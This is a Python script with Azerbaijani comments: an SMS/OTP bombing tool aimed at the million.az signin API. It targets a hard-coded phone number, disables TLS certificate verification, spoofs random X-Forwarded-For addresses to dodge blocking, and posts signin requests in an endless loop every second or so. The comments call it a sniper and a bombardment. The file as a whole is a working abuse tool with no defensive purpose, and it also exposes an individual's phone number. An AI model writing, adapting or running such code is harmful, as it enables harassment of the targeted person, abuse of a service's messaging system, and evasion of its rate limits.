import urllib.request
import json
import random
import time
import ssl

# --- SƏLAHİYYƏTLİ HƏDƏF NÖMRƏ ---
# Million adətən nömrəni '50XXXXXXX' formatında istəyir (994 olmadan)
TARGET_PHONE = "508880067" 

def million_strike():
    print(f"[!!!] MILLION.AZ SNIPER AKTİVDİR: {TARGET_PHONE}")
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Million.az-ın hal-hazırda istifadə etdiyi real API ünvanı
    url = "https://www.million.az/api/v1/auth/signin"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.million.az/auth/signin",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

    # Million-un tələb etdiyi real JSON formatı
    data = json.dumps({
        "msisdn": TARGET_PHONE,
        "rememberMe": True
    }).encode('utf-8')

    while True:
        try:
            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
            
            with urllib.request.urlopen(req, context=ctx, timeout=12) as resp:
                status = resp.getcode()
                # Million uğurlu olanda 200 və ya 201 qaytarır
                print(f"[HIT] Million OTP Siqnalı Göndərildi! Status: {status}")
            
            # Sürətli bombardman: hər 1-2 saniyədən bir
            time.sleep(random.uniform(0.5, 1.5))

        except Exception as e:
            # Əgər 403 verərsə İP-ni yeniləyirik
            print(f"[BLOK] Session müvəqqəti dayandırıldı. Yenidən cəhd edilir... {e}")
            time.sleep(3)

if __name__ == "__main__":
    million_strike()
